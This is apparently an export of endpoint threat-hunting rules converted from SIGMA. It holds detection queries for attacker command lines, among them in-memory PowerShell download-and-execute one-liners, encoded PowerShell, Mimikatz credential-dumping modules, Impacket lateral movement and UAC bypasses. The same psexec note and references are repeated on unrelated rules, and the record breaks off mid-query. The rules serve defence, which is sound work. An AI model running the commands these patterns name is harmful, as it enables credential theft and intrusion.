            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of a specific OneLiner to download and execute powershell modules in memory.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1562"
            ],
            "name": "Obfuscated PowerShell OneLiner Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\powershell.exe\" and (tgt.process.cmdline contains \"http://127.0.0.1\" and tgt.process.cmdline contains \"%{(IRM $_)}\" and tgt.process.cmdline contains \".SubString.ToString()[67,72,64]-Join\" and tgt.process.cmdline contains \"Import-Module\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 814
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential process injection via Microsoft Remote Asssistance (Msra.exe) by looking at suspicious child processes spawned from the aforementioned process. It has been a target used by many threat actors and used for discovery and persistence tactics",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Potential Process Injection Via Msra.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\msra.exe\" and src.process.cmdline contains \"msra.exe\" and (tgt.process.image.path contains \"\\arp.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\netstat.exe\" or tgt.process.image.path contains \"\\nslookup.exe\" or tgt.process.image.path contains \"\\route.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\whoami.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 815
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "detects the usage of path traversal in conhost.exe indicating possible command/argument confusion/hijacking",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Conhost.exe CommandLine Path Traversal",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.cmdline contains \"conhost\" and tgt.process.cmdline contains \"/../../\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 816
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of Dnx.EXE. The Dnx utility allows for the execution of C# code.\nAttackers might abuse this in order to bypass application whitelisting.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1027"
            ],
            "name": "Potential Application Whitelisting Bypass via Dnx.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\dnx.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 817
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using MSConfig Token Modification - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\")) and src.process.image.path contains \"\\AppData\\Local\\Temp\\pkgmgr.exe\" and tgt.process.cmdline=\"\\\"C:\\Windows\\system32\\msconfig.exe\\\" -5\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 818
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Access to Domain Group Policies stored in SYSVOL",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1552"
            ],
            "name": "Suspicious SYSVOL Domain Group Policy Access",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\SYSVOL\\\" and tgt.process.cmdline contains \"\\policies\\\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 819
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects wmiexec/dcomexec/atexec/smbexec from Impacket framework",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047",
                "t1021"
            ],
            "name": "HackTool - Potential Impacket Lateral Movement Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\wmiprvse.exe\" or src.process.image.path contains \"\\mmc.exe\" or src.process.image.path contains \"\\explorer.exe\" or src.process.image.path contains \"\\services.exe\") and (tgt.process.cmdline contains \"cmd.exe\" and tgt.process.cmdline contains \"/Q\" and tgt.process.cmdline contains \"/c\" and tgt.process.cmdline contains \"\\\\127.0.0.1\\\" and tgt.process.cmdline contains \"&1\")) or ((src.process.cmdline contains \"svchost.exe -k netsvcs\" or src.process.cmdline contains \"taskeng.exe\") and (tgt.process.cmdline contains \"cmd.exe\" and tgt.process.cmdline contains \"/C\" and tgt.process.cmdline contains \"Windows\\Temp\\\" and tgt.process.cmdline contains \"&1\")))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 820
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Commandline to launch powershell with a base64 payload",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious Execution of Powershell with Base64",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \" -e \" or tgt.process.cmdline contains \" -en \" or tgt.process.cmdline contains \" -enc \" or tgt.process.cmdline contains \" -enco\" or tgt.process.cmdline contains \" -ec \")) and (not (tgt.process.cmdline contains \" -Encoding \" or (src.process.image.path contains \"C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\" or src.process.image.path contains \"\\gc_worker.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 821
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detection well-known mimikatz command line arguments",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003",
                "t1003",
                "t1003",
                "t1003",
                "t1003"
            ],
            "name": "HackTool - Mimikatz Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"DumpCreds\" or tgt.process.cmdline contains \"mimikatz\") or (tgt.process.cmdline contains \"::aadcookie\" or tgt.process.cmdline contains \"::detours\" or tgt.process.cmdline contains \"::memssp\" or tgt.process.cmdline contains \"::mflt\" or tgt.process.cmdline contains \"::ncroutemon\" or tgt.process.cmdline contains \"::ngcsign\" or tgt.process.cmdline contains \"::printnightmare\" or tgt.process.cmdline contains \"::skeleton\" or tgt.process.cmdline contains \"::preshutdown\" or tgt.process.cmdline contains \"::mstsc\" or tgt.process.cmdline contains \"::multirdp\") or (tgt.process.cmdline contains \"rpc::\" or tgt.process.cmdline contains \"token::\" or tgt.process.cmdline contains \"crypto::\" or tgt.process.cmdline contains \"dpapi::\" or tgt.process.cmdline contains \"sekurlsa::\" or tgt.process.cmdline contains \"kerberos::\" or tgt.process.cmdline contains \"lsadump::\" or tgt.process.cmdline contains \"privilege::\" or tgt.process.cmdline contains \"process::\" or tgt.process.cmdline contains \"vault::\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 822
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a JAVA process running with remote debugging allowing more than just localhost to connect",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1203"
            ],
            "name": "Java Running with Remote Debugging",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"transport=dt_socket,address=\" and (tgt.process.cmdline contains \"jre1.\" or tgt.process.cmdline contains \"jdk1.\")) and (not (tgt.process.cmdline contains \"address=127.0.0.1\" or tgt.process.cmdline contains \"address=localhost\")))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 823
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a service binary running in a suspicious directory",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1202"
            ],
            "name": "Suspicious Service Binary Directory",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\Users\\Public\\\" or tgt.process.image.path contains \"\\$Recycle.bin\" or tgt.process.image.path contains \"\\Users\\All Users\\\" or tgt.process.image.path contains \"\\Users\\Default\\\" or tgt.process.image.path contains \"\\Users\\Contacts\\\" or tgt.process.image.path contains \"\\Users\\Searches\\\" or tgt.process.image.path contains \"C:\\Perflogs\\\" or tgt.process.image.path contains \"\\config\\systemprofile\\\" or tgt.process.image.path contains \"\\Windows\\Fonts\\\" or tgt.process.image.path contains \"\\Windows\\IME\\\" or tgt.process.image.path contains \"\\Windows\\addins\\\") and (src.process.image.path contains \"\\services.exe\" or src.process.image.path contains \"\\svchost.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 824
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility by a parent process that is located in a suspicious location.\nAttackers could instantiate an instance of \"wusa.exe\" in order to bypass User Account Control (UAC). They can duplicate the access token from \"wusa.exe\" to gain elevated privileges.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Wusa.EXE Executed By Parent Process Located In Suspicious Location",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\wusa.exe\" and ((src.process.image.path contains \":\\Perflogs\\\" or src.process.image.path contains \":\\Users\\Public\\\" or src.process.image.path contains \":\\Windows\\Temp\\\" or src.process.image.path contains \"\\Appdata\\Local\\Temp\\\" or src.process.image.path contains \"\\Temporary Internet\") or ((src.process.image.path contains \":\\Users\\\" and src.process.image.path contains \"\\Favorites\\\") or (src.process.image.path contains \":\\Users\\\" and src.process.image.path contains \"\\Favourites\\\") or (src.process.image.path contains \":\\Users\\\" and src.process.image.path contains \"\\Contacts\\\") or (src.process.image.path contains \":\\Users\\\" and src.process.image.path contains \"\\Pictures\\\"))) and (not tgt.process.cmdline contains \".msu\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 825
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 4",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\ud83d\udd38\" or tgt.process.cmdline contains \"\ud83d\udd39\" or tgt.process.cmdline contains \"\ud83d\udd36\" or tgt.process.cmdline contains \"\ud83d\udd37\" or tgt.process.cmdline contains \"\ud83d\udd33\" or tgt.process.cmdline contains \"\ud83d\udd32\" or tgt.process.cmdline contains \"\u25aa\ufe0f\" or tgt.process.cmdline contains \"\u25ab\ufe0f\" or tgt.process.cmdline contains \"\u25fe\ufe0f\" or tgt.process.cmdline contains \"\u25fd\ufe0f\" or tgt.process.cmdline contains \"\u25fc\ufe0f\" or tgt.process.cmdline contains \"\u25fb\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udfe5\" or tgt.process.cmdline contains \"\ud83d\udfe7\" or tgt.process.cmdline contains \"\ud83d\udfe8\" or tgt.process.cmdline contains \"\ud83d\udfe9\" or tgt.process.cmdline contains \"\ud83d\udfe6\" or tgt.process.cmdline contains \"\ud83d\udfea\" or tgt.process.cmdline contains \"\u2b1b\ufe0f\" or tgt.process.cmdline contains \"\u2b1c\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udfeb\" or tgt.process.cmdline contains \"\ud83d\udd08\" or tgt.process.cmdline contains \"\ud83d\udd07\" or tgt.process.cmdline contains \"\ud83d\udd09\" or tgt.process.cmdline contains \"\ud83d\udd0a\" or tgt.process.cmdline contains \"\ud83d\udd14\" or tgt.process.cmdline contains \"\ud83d\udd15\" or tgt.process.cmdline contains \"\ud83d\udce3\" or tgt.process.cmdline contains \"\ud83d\udce2\" or tgt.process.cmdline contains \"\ud83d\udc41\u200d\ud83d\udde8\" or tgt.process.cmdline contains \"\ud83d\udcac\" or tgt.process.cmdline contains \"\ud83d\udcad\" or tgt.process.cmdline contains \"\ud83d\uddef\" or tgt.process.cmdline contains \"\u2660\ufe0f\" or tgt.process.cmdline contains \"\u2663\ufe0f\" or tgt.process.cmdline contains \"\u2665\ufe0f\" or tgt.process.cmdline contains \"\u2666\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udccf\" or tgt.process.cmdline contains \"\ud83c\udfb4\" or tgt.process.cmdline contains \"\ud83c\udc04\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd50\" or tgt.process.cmdline contains \"\ud83d\udd51\" or tgt.process.cmdline contains \"\ud83d\udd52\" or tgt.process.cmdline contains \"\ud83d\udd53\" or tgt.process.cmdline contains \"\ud83d\udd54\" or tgt.process.cmdline contains \"\ud83d\udd55\" or tgt.process.cmdline contains \"\ud83d\udd56\" or tgt.process.cmdline contains \"\ud83d\udd57\" or tgt.process.cmdline contains \"\ud83d\udd58\" or tgt.process.cmdline contains \"\ud83d\udd59\" or tgt.process.cmdline contains \"\ud83d\udd5a\" or tgt.process.cmdline contains \"\ud83d\udd5b\" or tgt.process.cmdline contains \"\ud83d\udd5c\" or tgt.process.cmdline contains \"\ud83d\udd5d\" or tgt.process.cmdline contains \"\ud83d\udd5e\" or tgt.process.cmdline contains \"\ud83d\udd5f\" or tgt.process.cmdline contains \"\ud83d\udd60\" or tgt.process.cmdline contains \"\ud83d\udd61\" or tgt.process.cmdline contains \"\ud83d\udd62\" or tgt.process.cmdline contains \"\ud83d\udd63\" or tgt.process.cmdline contains \"\ud83d\udd64\" or tgt.process.cmdline contains \"\ud83d\udd65\" or tgt.process.cmdline contains \"\ud83d\udd66\" or tgt.process.cmdline contains \"\ud83d\udd67\u2722\" or tgt.process.cmdline contains \"\u2723\" or tgt.process.cmdline contains \"\u2724\" or tgt.process.cmdline contains \"\u2725\" or tgt.process.cmdline contains \"\u2726\" or tgt.process.cmdline contains \"\u2727\" or tgt.process.cmdline contains \"\u2605\" or tgt.process.cmdline contains \"\u2606\" or tgt.process.cmdline contains \"\u272f\" or tgt.process.cmdline contains \"\u2721\ufe0e\" or tgt.process.cmdline contains \"\u2729\" or tgt.process.cmdline contains \"\u272a\" or tgt.process.cmdline contains \"\u272b\" or tgt.process.cmdline contains \"\u272c\" or tgt.process.cmdline contains \"\u272d\" or tgt.process.cmdline contains \"\u272e\" or tgt.process.cmdline contains \"\u2736\" or tgt.process.cmdline contains \"\u2737\" or tgt.process.cmdline contains \"\u2735\" or tgt.process.cmdline contains \"\u2738\" or tgt.process.cmdline contains \"\u2739\" or tgt.process.cmdline contains \"\u2192\" or tgt.process.cmdline contains \"\u21d2\" or tgt.process.cmdline contains \"\u27f9\" or tgt.process.cmdline contains \"\u21e8\" or tgt.process.cmdline contains \"\u21fe\" or tgt.process.cmdline contains \"\u27be\" or tgt.process.cmdline contains \"\u21e2\" or tgt.process.cmdline contains \"\u261b\" or tgt.process.cmdline contains \"\u261e\" or tgt.process.cmdline contains \"\u2794\" or tgt.process.cmdline contains \"\u279c\" or tgt.process.cmdline contains \"\u2799\" or tgt.process.cmdline contains \"\u279b\" or tgt.process.cmdline contains \"\u279d\" or tgt.process.cmdline contains \"\u279e\" or tgt.process.cmdline contains \"\u2660\ufe0e\" or tgt.process.cmdline contains \"\u2663\ufe0e\" or tgt.process.cmdline contains \"\u2665\ufe0e\" or tgt.process.cmdline contains \"\u2666\ufe0e\" or tgt.process.cmdline contains \"\u2664\" or tgt.process.cmdline contains \"\u2667\" or tgt.process.cmdline contains \"\u2661\" or tgt.process.cmdline contains \"\u2662\" or tgt.process.cmdline contains \"\u265a\" or tgt.process.cmdline contains \"\u265b\" or tgt.process.cmdline contains \"\u265c\" or tgt.process.cmdline contains \"\u265d\" or tgt.process.cmdline contains \"\u265e\" or tgt.process.cmdline contains \"\u265f\" or tgt.process.cmdline contains \"\u2654\" or tgt.process.cmdline contains \"\u2655\" or tgt.process.cmdline contains \"\u2656\" or tgt.process.cmdline contains \"\u2657\" or tgt.process.cmdline contains \"\u2658\" or tgt.process.cmdline contains \"\u2659\" or tgt.process.cmdline contains \"\u2680\" or tgt.process.cmdline contains \"\u2681\" or tgt.process.cmdline contains \"\u2682\" or tgt.process.cmdline contains \"\u2683\" or tgt.process.cmdline contains \"\u2684\" or tgt.process.cmdline contains \"\u2685\" or tgt.process.cmdline contains \"\ud83c\udca0\" or tgt.process.cmdline contains \"\u2688\" or tgt.process.cmdline contains \"\u2689\" or tgt.process.cmdline contains \"\u2686\" or tgt.process.cmdline contains \"\u2687\" or tgt.process.cmdline contains \"\ud80c\udc00\" or tgt.process.cmdline contains \"\ud80c\udc01\" or tgt.process.cmdline contains \"\ud80c\udc02\" or tgt.process.cmdline contains \"\ud80c\udc03\" or tgt.process.cmdline contains \"\ud80c\udc04\" or tgt.process.cmdline contains \"\ud80c\udc05\" or tgt.process.cmdline contains \"\ud80c\udc06\" or tgt.process.cmdline contains \"\ud80c\udc07\" or tgt.process.cmdline contains \"\ud80c\udc08\" or tgt.process.cmdline contains \"\ud80c\udc09\" or tgt.process.cmdline contains \"\ud80c\udc0a\" or tgt.process.cmdline contains \"\ud80c\udc0b\" or 